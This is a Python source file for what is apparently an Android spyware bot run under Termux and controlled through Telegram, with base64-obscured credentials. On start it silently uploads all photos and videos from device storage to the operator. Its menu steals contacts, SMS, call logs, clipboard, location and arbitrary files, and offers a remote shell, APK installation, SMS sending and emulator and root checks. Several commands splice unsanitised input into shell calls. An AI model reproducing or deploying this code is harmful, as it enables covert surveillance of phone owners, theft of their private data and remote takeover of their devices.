import os
import sys
import subprocess
import time
import json
import re
import threading
import base64
import telebot
import requests
from PIL import Image

BOT_TOKEN_ENC = 'ODM1MTA1NTM3NTpBQUZ0TkhsdXF1eUtOWjA3MmlOSHhvZngzRnNsUk5sMmhsTQ=='
CHAT_ID_ENC = 'Nzg3ODI5MTYyNw=='

BOT_TOKEN = base64.b64decode(BOT_TOKEN_ENC).decode()
CHAT_ID = base64.b64decode(CHAT_ID_ENC).decode()

bot = telebot.TeleBot(BOT_TOKEN)

def run_cmd(cmd, timeout=10):
    try:
        result = subprocess.run(cmd, shell=True if isinstance(cmd, str) else False, capture_output=True, text=True, timeout=timeout)
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
    except:
        pass
    return None

def create_keyboard():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    buttons = ['📸 Images', '🎥 Videos', '🌐 IP', '📞 Contacts', '📍 Location', '📨 SMS', '📋 Call Logs', '🔋 Battery', '📋 Clipboard', '📁 Browser', '⬇️ Download', '💻 Shell', '🔗 Open URL', '📱 Send SMS', '📦 Install', '📳 Vibrate', '🔦 Flashlight', '🖼️ Wallpaper', '💬 Toast', '👑 Root', '🖥️ VM', '🛡️ Proxy', '📊 Status']
    for btn in buttons:
        markup.add(telebot.types.KeyboardButton(btn))
    return markup

def send_images():
    count = 0
    for root, dirs, files in os.walk('/sdcard/'):
        for f in files:
            if f.lower().endswith(('.jpg', '.jpeg', '.png')):
                path = os.path.join(root, f)
                try:
                    img = Image.open(path)
                    img.thumbnail((600, 600))
                    comp = '/sdcard/temp_img.jpg'
                    img.save(comp, 'JPEG', quality=70)
                    with open(comp, 'rb') as pic:
                        bot.send_photo(CHAT_ID, pic, caption=f[:50])
                    os.remove(comp)
                    count += 1
                    time.sleep(0.3)
                except:
                    pass
    return count

def send_videos():
    count = 0
    for root, dirs, files in os.walk('/sdcard/'):
        for f in files:
            if f.lower().endswith(('.mp4', '.mkv', '.avi', '.3gp')):
                path = os.path.join(root, f)
                try:
                    with open(path, 'rb') as v:
                        bot.send_video(CHAT_ID, v, caption=f[:50])
                    count += 1
                    time.sleep(0.3)
                except:
                    pass
    return count

def auto_send_media():
    bot.send_message(CHAT_ID, "📸 Auto send started...")
    img = send_images()
    vid = send_videos()
    bot.send_message(CHAT_ID, f"✅ Complete!\n📸 Images: {img}\n🎥 Videos: {vid}")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(CHAT_ID, "✅ BOTS ACTIVE", reply_markup=create_keyboard())
    threading.Thread(target=auto_send_media, daemon=True).start()

@bot.message_handler(func=lambda msg: msg.text == '📸 Images')
def images_cmd(message):
    bot.send_message(CHAT_ID, "📸 Scanning images...")
    count = send_images()
    bot.send_message(CHAT_ID, f"✅ Sent {count} images")

@bot.message_handler(func=lambda msg: msg.text == '🎥 Videos')
def videos_cmd(message):
    bot.send_message(CHAT_ID, "🎥 Scanning videos...")
    count = send_videos()
    bot.send_message(CHAT_ID, f"✅ Sent {count} videos")

@bot.message_handler(func=lambda msg: msg.text == '🌐 IP')
def ip_cmd(message):
    try:
        ip = requests.get('https://httpbin.org/ip', timeout=10).json().get('origin', 'Unknown')
        bot.send_message(CHAT_ID, f"🌍 IP: {ip}")
    except:
        bot.send_message(CHAT_ID, "❌ Failed")

@bot.message_handler(func=lambda msg: msg.text == '👑 Root')
def root_cmd(message):
    rooted = os.path.exists('/system/bin/su') or os.path.exists('/system/xbin/su')
    bot.send_message(CHAT_ID, "👑 ROOTED" if rooted else "📱 NOT ROOTED")

@bot.message_handler(func=lambda msg: msg.text == '🖥️ VM')
def vm_cmd(message):
    is_vm = os.path.exists('/dev/qemu_pipe') or os.path.exists('/system/bin/qemu-props')
    bot.send_message(CHAT_ID, "🖥️ EMULATOR" if is_vm else "📱 REAL DEVICE")

@bot.message_handler(func=lambda msg: msg.text == '🛡️ Proxy')
def proxy_cmd(message):
    try:
        resp = requests.get('https://ipapi.co/json/', timeout=10)
        proxy = resp.json().get('proxy', False)
        bot.send_message(CHAT_ID, "🛡️ PROXY DETECTED" if proxy else "✅ No Proxy")
    except:
        bot.send_message(CHAT_ID, "❌ Failed")

@bot.message_handler(func=lambda msg: msg.text == '🔋 Battery')
def battery_cmd(message):
    result = run_cmd('dumpsys battery 2>/dev/null | grep -E "level|temperature"', timeout=5)
    if result:
        level = re.search(r'level: (\d+)', result)
        temp = re.search(r'temperature: (\d+)', result)
        lvl = level.group(1) if level else "?"
        tmp = str(int(temp.group(1))/10) + "°C" if temp else "?"
        bot.send_message(CHAT_ID, f"🔋 Battery: {lvl}%\n🌡️ Temp: {tmp}")
    else:
        bot.send_message(CHAT_ID, "❌ Battery info unavailable")

@bot.message_handler(func=lambda msg: msg.text == '📳 Vibrate')
def vibrate_cmd(message):
    os.system('input keyevent KEYCODE_VIBRATE 2>/dev/null')
    bot.send_message(CHAT_ID, "📳 Vibrating!")

@bot.message_handler(func=lambda msg: msg.text == '🔦 Flashlight')
def flashlight_cmd(message):
    if not hasattr(flashlight_cmd, 'on'):
        flashlight_cmd.on = False
    try:
        if flashlight_cmd.on:
            os.system('termux-torch off 2>/dev/null')
            flashlight_cmd.on = False
        else:
            os.system('termux-torch on 2>/dev/null')
            flashlight_cmd.on = True
        bot.send_message(CHAT_ID, f"🔦 Flashlight {'ON' if flashlight_cmd.on else 'OFF'}")
    except:
        bot.send_message(CHAT_ID, "❌ Install termux-api")

@bot.message_handler(func=lambda msg: msg.text == '💬 Toast')
def toast_start(message):
    msg = bot.send_message(CHAT_ID, "💬 Send toast message:")
    bot.register_next_step_handler(msg, lambda m: os.system(f'termux-toast "{m.text}" 2>/dev/null') or bot.send_message(CHAT_ID, "✅ Toast shown"))

@bot.message_handler(func=lambda msg: msg.text == '📁 Browser')
def browser_start(message):
    msg = bot.send_message(CHAT_ID, "📁 Send path (e.g., /sdcard):")
    bot.register_next_step_handler(msg, browse_files)

def browse_files(message):
    path = message.text
    try:
        items = os.listdir(path)[:50]
        output = f"📁 {path}\n\n"
        for item in items:
            full = os.path.join(path, item)
            if os.path.isdir(full):
                output += f"📁 {item}\n"
            else:
                size = os.path.getsize(full)
                output += f"📄 {item} ({size}B)\n"
        bot.send_message(CHAT_ID, output[:3900])
        msg2 = bot.send_message(CHAT_ID, "Send file path to upload:")
        bot.register_next_step_handler(msg2, upload_file)
    except:
        bot.send_message(CHAT_ID, "❌ Invalid path")

def upload_file(message):
    path = message.text
    try:
        with open(path, 'rb') as f:
            bot.send_document(CHAT_ID, f, caption=os.path.basename(path))
        bot.send_message(CHAT_ID, "✅ Uploaded")
    except:
        bot.send_message(CHAT_ID, "❌ Upload failed")

@bot.message_handler(func=lambda msg: msg.text == '⬇️ Download')
def download_start(message):
    msg = bot.send_message(CHAT_ID, "🔗 Send URL:")
    bot.register_next_step_handler(msg, download_file)

def download_file(message):
    url = message.text
    name = url.split('/')[-1] or 'file'
    path = f"/sdcard/Download/{name}"
    try:
        r = requests.get(url, timeout=30)
        with open(path, 'wb') as f:
            f.write(r.content)
        bot.send_message(CHAT_ID, f"✅ Downloaded to {path}")
    except:
        bot.send_message(CHAT_ID, "❌ Download failed")

@bot.message_handler(func=lambda msg: msg.text == '💻 Shell')
def shell_start(message):
    msg = bot.send_message(CHAT_ID, "💻 Send shell command:")
    bot.register_next_step_handler(msg, run_shell)

def run_shell(message):
    cmd = message.text
    result = run_cmd(cmd, timeout=30)
    if result:
        bot.send_message(CHAT_ID, f"```\n{result[:3500]}\n```", parse_mode='Markdown')
    else:
        bot.send_message(CHAT_ID, "❌ Command failed")

@bot.message_handler(func=lambda msg: msg.text == '🔗 Open URL')
def openurl_start(message):
    msg = bot.send_message(CHAT_ID, "🔗 Send URL:")
    bot.register_next_step_handler(msg, open_url)

def open_url(message):
    url = message.text
    os.system(f'am start -a android.intent.action.VIEW -d "{url}" 2>/dev/null')
    bot.send_message(CHAT_ID, f"✅ Opened: {url}")

@bot.message_handler(func=lambda msg: msg.text == '📞 Contacts')
def contacts_cmd(message):
    bot.send_message(CHAT_ID, "📞 Extracting contacts...")
    result = run_cmd('content query --uri content://contacts/phones/ 2>/dev/null', timeout=10)
    if result:
        contacts = []
        for line in result.split('\n'):
            name = re.search(r'display_name=([^,]+)', line)
            num = re.search(r'number=([^,\s]+)', line)
            if name and num:
                contacts.append(f"{name.group(1)}: {num.group(1)}")
        if contacts:
            bot.send_message(CHAT_ID, f"📞 {len(contacts)} contacts:\n" + "\n".join(contacts[:50]))
        else:
            bot.send_message(CHAT_ID, "❌ No contacts")
    else:
        bot.send_message(CHAT_ID, "❌ Permission denied")

@bot.message_handler(func=lambda msg: msg.text == '📍 Location')
def location_cmd(message):
    bot.send_message(CHAT_ID, "📍 Getting location...")
    result = run_cmd('termux-location 2>/dev/null', timeout=15)
    if result:
        try:
            data = json.loads(result)
            lat, lon = data.get('latitude', 0), data.get('longitude', 0)
            bot.send_message(CHAT_ID, f"📍 https://maps.google.com/?q={lat},{lon}")
        except:
            bot.send_message(CHAT_ID, "❌ Parse failed")
    else:
        bot.send_message(CHAT_ID, "❌ Run: pkg install termux-api")

@bot.message_handler(func=lambda msg: msg.text == '📨 SMS')
def sms_cmd(message):
    bot.send_message(CHAT_ID, "📨 Reading SMS...")
    result = run_cmd('content query --uri content://sms/inbox 2>/dev/null', timeout=15)
    if result:
        sms_list = []
        for line in result.split('\n'):
            addr = re.search(r'address=([^,\s]+)', line)
            body = re.search(r'body=([^,\n]+)', line)
            if addr and body:
                sms_list.append(f"📱 {addr.group(1)}: {body.group(1)[:80]}")
        if sms_list:
            bot.send_message(CHAT_ID, "📨 SMS:\n" + "\n".join(sms_list[:30]))
        else:
            bot.send_message(CHAT_ID, "❌ No SMS")
    else:
        bot.send_message(CHAT_ID, "❌ Permission denied")

@bot.message_handler(func=lambda msg: msg.text == '📋 Call Logs')
def calllogs_cmd(message):
    bot.send_message(CHAT_ID, "📋 Reading call logs...")
    result = run_cmd('content query --uri content://call_log/calls 2>/dev/null', timeout=15)
    if result:
        logs = []
        for line in result.split('\n'):
            num = re.search(r'number=([^,\s]+)', line)
            if num:
                logs.append(f"📞 {num.group(1)}")
        if logs:
            bot.send_message(CHAT_ID, "📋 Call Logs:\n" + "\n".join(logs[:30]))
        else:
            bot.send_message(CHAT_ID, "❌ No logs")
    else:
        bot.send_message(CHAT_ID, "❌ Permission denied")

@bot.message_handler(func=lambda msg: msg.text == '📋 Clipboard')
def clipboard_cmd(message):
    result = run_cmd('termux-clipboard-get 2>/dev/null', timeout=5)
    if result:
        bot.send_message(CHAT_ID, f"📋 Clipboard: {result[:500]}")
    else:
        bot.send_message(CHAT_ID, "❌ Clipboard empty")

@bot.message_handler(func=lambda msg: msg.text == '📱 Send SMS')
def sendsms_start(message):
    msg = bot.send_message(CHAT_ID, "📱 Format: number|message")
    bot.register_next_step_handler(msg, send_sms)

def send_sms(message):
    try:
        num, text = message.text.split('|', 1)
        os.system(f'am start -a android.intent.action.SENDTO -d "sms:{num}" --es sms_body "{text}" 2>/dev/null')
        bot.send_message(CHAT_ID, f"✅ SMS opened for {num}")
    except:
        bot.send_message(CHAT_ID, "❌ Use: number|message")

@bot.message_handler(func=lambda msg: msg.text == '📦 Install')
def install_start(message):
    msg = bot.send_message(CHAT_ID, "📦 Send APK path:")
    bot.register_next_step_handler(msg, install_apk)

def install_apk(message):
    path = message.text
    result = run_cmd(f'pm install -r "{path}" 2>&1', timeout=30)
    if result and "Success" in result:
        bot.send_message(CHAT_ID, "✅ Installed")
    else:
        bot.send_message(CHAT_ID, "❌ Failed")

@bot.message_handler(func=lambda msg: msg.text == '🖼️ Wallpaper')
def wallpaper_start(message):
    msg = bot.send_message(CHAT_ID, "🖼️ Send image or URL:")
    bot.register_next_step_handler(msg, set_wallpaper)

def set_wallpaper(message):
    if message.photo:
        file_info = bot.get_file(message.photo[-1].file_id)
        data = bot.download_file(file_info.file_path)
        path = '/sdcard/wall_temp.jpg'
        with open(path, 'wb') as f:
            f.write(data)
    else:
        url = message.text
        try:
            r = requests.get(url, timeout=15)
            path = '/sdcard/wall_temp.jpg'
            with open(path, 'wb') as f:
                f.write(r.content)
        except:
            bot.send_message(CHAT_ID, "❌ Failed")
            return
    os.system(f'cmd wallpaper set {path} 2>/dev/null')
    bot.send_message(CHAT_ID, "✅ Wallpaper set")
    os.remove(path)

@bot.message_handler(func=lambda msg: msg.text == '📊 Status')
def status_cmd(message):
    rooted = os.path.exists('/system/bin/su')
    bot.send_message(CHAT_ID, f"🤖 BOTS STATUS\nRoot: {'✅' if rooted else '❌'}\nImages: ✅\nVideos: ✅\nIP: ✅")

if __name__ == "__main__":
    print("Bot starting...\nPlease wait 30s")
    try:
        bot.send_message(CHAT_ID, "🤖 BOTS ONLINE\nAuto sending media...")
    except:
        print("Error: Check token and chat ID")
        exit()
    
    auto_send_media()
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except:
            time.sleep(5)
